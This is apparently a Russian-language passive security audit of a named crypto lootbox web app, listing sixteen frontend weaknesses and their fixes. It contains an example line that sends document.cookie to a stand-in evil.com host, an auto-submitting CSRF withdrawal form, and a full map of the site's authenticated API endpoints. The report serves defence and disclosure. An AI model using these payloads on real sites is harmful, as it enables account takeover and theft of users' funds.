# Security Audit Report: cc.zxcv.app (CYBERBOX)

**Дата:** 2026-02-20
**Объект:** https://cc.zxcv.app/en
**Метод:** Пассивный анализ публичного фронтенда (HTML, JS-бандлы, API, cookies)
**Инструмент:** Claude Code + WebFetch

---

## Executive Summary

CYBERBOX — это Next.js-приложение для открытия крипто-кейсов (лутбоксы). В ходе анализа фронтенда обнаружено **16 проблем**, из которых 2 критические, 4 высокие, 6 средних, 4 низкие. Наиболее серьёзная цепочка атак: **XSS → кража cookies → полный захват аккаунта + bypass CSRF** — работает из-за отсутствия флага `httpOnly` на auth-токенах.

---

## Стек и архитектура

| Компонент | Значение |
|---|---|
| Framework | Next.js (App Router) |
| Build ID | `VXXf_6GhJBpciNaY7uu8t` |
| API base | `https://cc.zxcv.app/api` |
| Медиа-ассеты | `https://cybbox.com/api/media/` (другой домен!) |
| State | Zustand + persist → localStorage |
| Analytics | Google Analytics G-77C9PD1XH5 |
| Fingerprint | FingerprintJS v4.6.2 |

---

## Сводная таблица рисков

| # | Уязвимость | Серьёзность | Категория |
|---|---|---|---|
| 1 | Auth cookies без флага `httpOnly` | **CRITICAL** | Authentication |
| 2 | Auth cookies без флага `secure` | **CRITICAL** | Authentication |
| 3 | Auth cookies без флага `sameSite` (CSRF) | **HIGH** | CSRF |
| 4 | Нет Content-Security-Policy | **HIGH** | XSS Defense |
| 5 | Нет CAPTCHA на login/register | **HIGH** | Brute Force |
| 6 | FingerprintJS visitorId как security-токен | **HIGH** | Auth Design |
| 7 | Вся API-поверхность в JS-бандле | **MEDIUM** | Info Disclosure |
| 8 | Данные пользователя в localStorage | **MEDIUM** | Data Exposure |
| 9 | Только клиентская валидация (адреса, cooldown) | **MEDIUM** | Input Validation |
| 10 | Нет X-Frame-Options (clickjacking) | **MEDIUM** | Clickjacking |
| 11 | Нет nonce на script-тегах | **MEDIUM** | XSS Defense |
| 12 | Нет Referrer-Policy | **LOW** | Privacy |
| 13 | Нет security.txt | **LOW** | Disclosure Policy |
| 14 | Нет sitemap.xml (404) | **LOW** | Informational |
| 15 | Build ID виден публично | **LOW** | Info Disclosure |
| 16 | Кросс-доменные ассеты (cybbox.com) | **LOW** | Architecture |

---

## Детальный анализ

### [CRITICAL] 1 & 2. Auth cookies без `httpOnly` и `secure`

**Источник:** `/_next/static/chunks/9712-*.js`, `5905-*.js`

```javascript
// access_token — НЕТ maxAge, httpOnly, secure, sameSite
setCookie("access_token", a)

// refresh_token — только maxAge, НЕТ httpOnly/secure/sameSite
setCookie("refresh_token", i, {maxAge: 2592e3})  // 30 дней

// fingerprint — только maxAge
setCookie("fingerprint", r, {maxAge: 2592e3})
```

Все три токена **читаемы через `document.cookie`** из JavaScript. Любая XSS-уязвимость даёт атакующему полный доступ к аккаунту. Токены также могут передаваться по HTTP (нет `secure`).

**Как работает атак-цепочка:**
```
1. Атакующий находит XSS на сайте
2. Внедряет: fetch("https://evil.com/?t=" + document.cookie)
3. Получает access_token + refresh_token
4. Входит в аккаунт жертвы, выводит средства
```

**Фикс (одна строка):**
```javascript
// БЫЛО:
setCookie("access_token", a)

// СТАЛО:
setCookie("access_token", a, {
  httpOnly: true,
  secure: true,
  sameSite: "Strict"
})
```

---

### [HIGH] 3. Нет CSRF-защиты

Флаг `sameSite` отсутствует на всех auth-cookies. Это означает, что cookie отправляются при cross-site запросах. Нет CSRF-токенов ни в формах, ни в fetch-вызовах.

**Уязвимые эндпоинты:**
- `POST /api/user/payments/withdrawal` — вывод средств
- `POST /api/user/cryptocases/buy` — покупка кейса
- `POST /api/user/logout`
- `POST /api/user/password/change`

**Пример CSRF-атаки:**
```html
<!-- Страница атакующего -->
<form action="https://cc.zxcv.app/api/user/payments/withdrawal" method="POST">
  <input name="address" value="АДРЕС_АТАКУЮЩЕГО">
  <input name="amount" value="9999">
</form>
<script>document.forms[0].submit()</script>
```

---

### [HIGH] 4. Нет Content-Security-Policy

Ни одного CSP-заголовка не обнаружено — ни HTTP-заголовка, ни `<meta http-equiv="Content-Security-Policy">`. Нет nonce на `<script>`-тегах.

Без CSP любой внедрённый скрипт выполняется с полными правами приложения.

---

### [HIGH] 5. Нет CAPTCHA на login/register

На `/en/sign-in` и `/en/register` отсутствует защита от ботов (reCAPTCHA, hCaptcha, Turnstile). Это открывает:
- **Credential stuffing** — перебор утечек паролей
- **Automated registration** — спам-аккаунты
- **Brute-force** на пароли (если нет server-side rate limiting)

---

### [HIGH] 6. FingerprintJS visitorId как security-токен

```javascript
// Из chunk 7940
let t = await FingerprintJS.load();
let r = await t.get();
setCookie("fingerprint", r.visitorId, {maxAge: 2592e3})

// При refresh токена:
fetch("/api/users/auth/refresh", {
  body: JSON.stringify({
    fingerprint: getCookie("fingerprint"),  // ← это НЕ секрет
    refresh_token: getCookie("refresh_token")
  })
})
```

FingerprintJS `visitorId` — детерминированный идентификатор, зависящий от характеристик браузера. Он **не является секретом** — его алгоритм открытый (MIT-лицензия), и его можно воспроизвести. Использовать его как второй фактор аутентификации — архитектурная ошибка.

---

### [MEDIUM] 7. Полная API-поверхность в JS-бандле

Из бандла `5905-382bebe4b3da1053.js` извлечён полный список эндпоинтов:

```
Base: https://cc.zxcv.app/api

POST  /users/login
POST  /users/register
POST  /users/auth/refresh
POST  /users/password/forgot
POST  /users/password/reset
POST  /users/email-confirmation
POST  /users/verification-email/send
POST  /referrals/check
GET   /app/info
GET   /cryptocases/get
GET   /cryptocases/list
GET   /referrals/levels
GET   /payments/calc
GET   /payments/currencies/withdrawal
GET   /payments/currencies/deposit

# Authenticated:
GET   /user/get
GET   /user/wager/active
GET   /user/wager/last
POST  /user/wager/ack
GET   /user/statistics
POST  /user/logout
POST  /user/cryptocases/buy
POST  /user/inventory/prize/sell
GET   /user/inventory
GET   /user/payments/transactions/list
POST  /user/payments/withdrawal
POST  /user/password/change
POST  /user/verification-code/send
POST  /user/verification-code/check
POST  /user/promocode/activate
POST  /user/payments/deposit/card
POST  /user/payments/deposit/crypto
GET   /user/payments/deposit/active
POST  /user/payments/deposit/cancel
GET   /user/payments/transaction/{hash}
GET   /user/transactions/get
GET   /user/promotions/list
GET   /user/referrals/list
GET   /user/referrals/statistics
GET   /banners/register
GET   /api/media/{filename}
POST  /user/promocodes/get
```

Это значительно упрощает разведку для атакующего.

---

### [MEDIUM] 8. User data в localStorage через Zustand persist

```javascript
// chunk 9712
{
  name: "userInfo",
  partialize: e => ({user: e.user})  // user-объект персистируется в localStorage
}
```

Данные пользователя (профиль, возможно баланс) сохраняются в `localStorage` под ключом `"userInfo"`. Это позволяет любому JS-коду на странице прочитать их. При XSS атакующий получит полный объект пользователя.

---

### [MEDIUM] 9. Только клиентская валидация

**Cooldown верификации:**
```javascript
// chunk 5445 — 30 секунд задержки только на фронте
setTimeout(() => { setDisabled(false) }, 30000)
```
Этот cooldown обходится прямым вызовом `POST /api/user/verification-code/send` минуя UI.

**Адрес вывода:**
```javascript
// chunk 6278 — Zod-валидация адреса только на фронте
withdrawal({token_standard: t, amount: Number(a), address: s})
```
Проверка адреса кошелька — только в браузере. Прямой API-запрос с невалидным адресом пройдёт через UI-защиту.

---

### [MEDIUM] 10 & 11. Нет X-Frame-Options и nonce

`X-Frame-Options: DENY` отсутствует → сайт можно встроить в iframe для clickjacking-атак (например, незаметная кнопка "вывода" поверх другого контента).

Нет `nonce=""` атрибутов на `<script>`-тегах → CSP в режиме `nonce-based` невозможен без рефакторинга.

---

### [LOW] 13 & 14. Нет security.txt и sitemap.xml

```
GET /.well-known/security.txt  → 404
GET /sitemap.xml               → 404
```

`security.txt` — стандарт для раскрытия контакта по безопасности (RFC 9116). Его отсутствие означает, что нет официального канала для responsible disclosure.

---

### [LOW] 15. Build ID публичен

```
buildId: "VXXf_6GhJBpciNaY7uu8t"
```

Позволяет атакующему точно знать версию деплоя и проверять наличие патчей после исправлений.

---

### [LOW] 16. Кросс-доменные ассеты (cybbox.com)

OG-изображения и медиафайлы отдаются с `cybbox.com`:
```html
<meta property="og:image" content="https://cybbox.com/api/media/Open_Graph.png">
```

В коде:
```javascript
"".concat(API_URL, "/api/media/").concat(item.image)
// где API_URL может резолвиться к cybbox.com
```

При добавлении CSP нужно будет явно разрешить `cybbox.com`. Если это старый домен — стоит мигрировать ассеты или убедиться, что он контролируется.

---

## Приоритетный план исправлений

### Немедленно (CRITICAL)

**1. Добавить httpOnly + secure + sameSite на cookies**

```javascript
// Пример для express/node
res.cookie("access_token", token, {
  httpOnly: true,      // недоступен для JS
  secure: true,        // только HTTPS
  sameSite: "Strict",  // блокирует CSRF
  maxAge: 15 * 60 * 1000  // 15 минут для access_token
})

res.cookie("refresh_token", refreshToken, {
  httpOnly: true,
  secure: true,
  sameSite: "Strict",
  maxAge: 30 * 24 * 60 * 60 * 1000  // 30 дней
})
```

> Это **единственное важнейшее исправление**. Оно закрывает CRITICAL #1, #2, HIGH #3 (CSRF) одновременно.

**2. Добавить CSP-заголовок**

```nginx
# nginx.conf
add_header Content-Security-Policy "
  default-src 'self';
  script-src 'self' https://www.googletagmanager.com;
  img-src 'self' https://cybbox.com;
  connect-src 'self' https://cc.zxcv.app https://cybbox.com;
  frame-ancestors 'none';
" always;

add_header X-Frame-Options "DENY" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header X-Content-Type-Options "nosniff" always;
```

### Высокий приоритет

**3. CAPTCHA на auth-эндпоинтах**

Рекомендуется Cloudflare Turnstile (бесплатный, privacy-friendly):
- Добавить на `/sign-in`, `/register`, `/forgot-password`
- Верифицировать токен на сервере перед обработкой

**4. Server-side rate limiting**

```
POST /api/users/login         → max 5 попыток / 15 мин / IP
POST /api/users/register      → max 3 / час / IP
POST /api/user/verification-code/send → max 1 / 30 сек / user (server-side!)
POST /api/user/payments/withdrawal   → max 3 / час / user
```

**5. Заменить FingerprintJS как security-механизм**

Вместо visitorId — использовать криптографически случайный `device_token`, генерируемый сервером при первом входе и хранимый в `httpOnly` cookie.

### Средний приоритет

**6. Минимизировать localStorage**

Из Zustand persist убрать чувствительные данные (баланс, email). Хранить только UI-настройки (звук, валюта).

**7. Серверная валидация адресов кошельков**

Проверять формат адреса на бэкенде для каждого `token_standard`.

### Низкий приоритет

**8. Создать `/.well-known/security.txt`**

```
Contact: security@cybbox.com
Expires: 2027-01-01T00:00:00.000Z
Preferred-Languages: en, ru
```

**9. Создать `sitemap.xml`**

**10. Ограничить информацию о версии (buildId)**

Настроить `generateBuildId` в `next.config.js` чтобы не использовать предсказуемый/читаемый ID в продакшне.

---

## Что НЕ найдено (хорошие признаки)

- Нет хардкоженных API-ключей или секретов в JS-бандлах
- Нет открытых debug/admin эндпоинтов (`/admin`, `/api/swagger`, `/graphql`)
- Нет `.env`-файлов в публичном доступе
- Bearer-токен правильно используется в заголовке Authorization (не в URL)
- HTTPS используется (нет mixed content)
- Нет стек-трейсов в HTML-ответах

---

*Отчёт создан на основе пассивного анализа публичного фронтенда. Серверная логика, база данных и инфраструктура не проверялись.*
